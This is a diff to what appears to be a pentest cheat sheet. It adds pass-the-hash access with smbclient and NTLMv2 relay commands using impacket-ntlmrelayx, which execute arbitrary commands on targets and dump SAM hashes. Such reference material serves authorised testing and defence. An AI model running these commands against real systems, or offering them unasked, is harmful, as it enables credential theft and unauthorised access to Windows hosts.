@@ -479,6 +479,19 @@ $ evil-winrm -i <IP> -u <user> -H <hash>
 Reg Key: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 $ xfreerdp  /v:<IP> /u:<user> /pth:<hash>
 ````
+**SMBClient**
+````
+smbclient \\\\<IP>\\<Share> -U <user> --pw-nt-hash <hash>
+````
+
+**NTLMV2 Relay**
+````
+# Excute command 
+$ impacket-ntlmrelayx --no-http-server -smb2support -t <Target-IP> -c "<command_to_execute>"
+
+# Autenticate and Dump Sam if the user is admin in that machine
+$ impacket-ntlmrelayx -smb2support -tf smb_target.txt
+````
 
 ### Pass the Ticket
 
